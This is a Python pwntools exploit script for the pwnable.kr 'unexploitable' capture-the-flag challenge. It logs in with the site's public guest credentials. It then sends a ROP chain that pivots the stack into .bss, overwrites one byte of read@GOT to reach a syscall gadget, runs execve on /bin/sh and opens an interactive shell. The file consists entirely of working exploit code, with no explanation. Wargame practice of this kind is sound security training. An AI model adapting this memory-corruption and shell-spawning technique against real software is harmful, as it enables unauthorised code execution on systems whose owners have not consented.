from pwn import *

###Addr
#  libc2.23
bss = 0x601800
read_plt = 0x400430
read_got = 0x601000
read_offset = 0xf7250
syscall_offset = 0xf725e

###ROPgadget
pop_rbp = 0x400512
leave = 0x400576
set_param = 0x4005e6
call_func = 0x4005d0

###Exploit
s = ssh(host='pwnable.kr', port=2222,
        user='unexploitable',
        password='guest')
r = s.process('./unexploitable')

padding = b'\x00'*0x18
ROPchain = p64(set_param)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(bss)+p64(0x150)+\
           p64(call_func)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(pop_rbp)+p64(bss-0x8)+\
           p64(leave)
payload = padding+ROPchain
r.send(payload.ljust(0x50f,b'\x00'))

ROPchain = p64(set_param)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(read_got)+p64(0x1)+\
           p64(call_func)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(set_param)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(1)+p64(bss)+p64(0x3b)+\
           p64(call_func)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(set_param)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(bss+0x148)+p64(0)+p64(0)+\
           p64(call_func)
argument = b'/bin/sh\x00'
payload = ROPchain+argument
r.send(payload)

r.send(p8(syscall_offset&0xff))

r.interactive()
